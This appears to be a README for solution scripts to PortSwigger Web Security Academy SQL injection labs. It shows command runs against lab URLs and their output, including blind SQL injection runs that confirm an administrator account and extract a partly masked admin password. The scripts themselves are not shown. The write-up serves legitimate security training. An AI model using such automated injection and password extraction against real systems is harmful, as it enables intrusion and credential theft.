## SQL Injection Labs - PortSwigger Academy


#### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
```sh
$ python where_sql_injection_hidden_data.py https://acf71f921e03f347807402610012004b.web-security-academy.net
High-End Gift Wrapping
Conversation Controlling Lemon
...
...
...
The Bucket of Doom
Folding Gadgets
ZZZZZZ Bed - Your New Home Office
```

#### Lab: Blind SQL Injection with Conditional Response
```sh
 $ python3 blind_sql_conditional_response.py https://aca11f2a1e76b68e80af965200bf0092.web-security-academy.net
 Checking users table: True
 Checking Administrator account: True
 Checking password length: 20
 Extracting Admin password: 4iwxwfcbXXXXXXXXXXXX
```

#### Lab: Blind SQL Injection with Conditional Errors
```sh
$ python blind_sql_injection_conditional_errors.py https://accf1fb81eb3ffbe80ab1379003a0078.web-security-academy.net
Checking users table: True
Checking Administrator account: True
Checking password length: 20
Extracting Admin password: fbut9j14XXXXXXXXXXXX
```
#### Lab: Blind SQL injection with time delays check
```sh
$ python blind_sql_injection_time_delay_test.py https://ac521fdc1ea4123980d0baf50078008e.web-security-academy.net
SQL Time Delay Injection detected
```
